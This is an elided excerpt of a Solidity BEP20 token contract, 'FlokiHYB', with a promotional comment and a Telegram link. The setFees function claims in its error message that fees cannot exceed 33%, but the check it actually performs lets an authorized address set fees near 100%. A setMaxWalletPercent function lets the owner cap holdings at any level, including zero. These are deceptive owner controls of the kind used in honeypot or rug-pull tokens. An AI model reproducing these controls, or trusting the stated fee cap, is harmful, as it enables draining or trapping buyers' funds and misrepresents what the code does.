...
/**
 Floki has your back, he won’t let you down thanks to his super buyback.
...
TG: https://t.me/FlokiHasYourBack
*/
...
contract FlokiHYB is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "FlokiHYB";
    string constant _symbol = "$FHYB";
    ...
    uint256 private _maxSupplyPercentage = rSupply.div(100).mul(100);
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xC6c9e43Cd15e51FFBadc7a81Da0F6B8596124294;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != buyBackFeeReceiver  && recipient != autoLiquidityReceiver){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + rAmount) <= _maxSupplyPercentage,"Total Holding is currently limited, you can not buy that much.");}
    ...
    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _buyBackFee, uint256 _feeDenominator) external authorized {
        ...
        require(totalFee < feeDenominator/1, "Fees cannot be more than 33%");
    }
    ...
    function checkMaxWalletToken() external view returns (uint256) {
        return _maxSupplyPercentage.div(rate);
    }
    ...
    function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000) external onlyOwner() {
        _maxSupplyPercentage = rSupply.div(1000).mul(maxWallPercent_base1000);
    }
